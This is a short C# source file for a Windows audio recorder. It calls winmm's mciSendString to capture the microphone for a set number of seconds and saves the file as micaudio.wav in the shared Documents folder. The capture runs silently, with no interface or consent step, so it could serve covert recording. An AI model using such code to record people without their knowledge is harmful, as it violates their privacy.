using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace AudioRecorder
{
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Threading;

    public class AudioRecorder
    {
   
        private static readonly string AudioPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + "\\micaudio.wav";
		private static readonly string LogPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + "\\micaudio.log.txt";
		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mciSendStringA", ExactSpelling = true, SetLastError = true)]
        private static extern int Record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
        [DllImport("winmm.dll")]
        public static extern int waveInGetNumDevs();

		public AudioRecorder()
        {
			// empty constructor
        }

		public void AudioInit(int second)
		{
			try
			{
				if (AudioRecorder.waveInGetNumDevs() == 0)
				{
					String logmsg = "Don't have a microphone.";
					File.WriteAllText(AudioRecorder.LogPath, logmsg);
					
				}
				else
				{
					AudioRecorder audioRecorder = new AudioRecorder();
					audioRecorder.StartAR();
					Thread.Sleep(100);
					DateTime now = DateTime.Now;
					while ((DateTime.Now - now).TotalMilliseconds < (double)(second * 1000))
					{
					}
					audioRecorder.SaveAR();
				}
			}
			catch (Exception ex)
			{
				File.WriteAllText(AudioRecorder.LogPath, ex.Message);
			}
		}

		public void StartAR()
		{
			AudioRecorder.Record("open new Type waveaudio Alias recsound", "", 0, 0);
			AudioRecorder.Record("record recsound", "", 0, 0);
		}

		public void SaveAR()
		{
			AudioRecorder.Record("save recsound " + AudioRecorder.AudioPath, "", 0, 0);
			AudioRecorder.Record("close recsound", "", 0, 0);
			
		}

	}
}
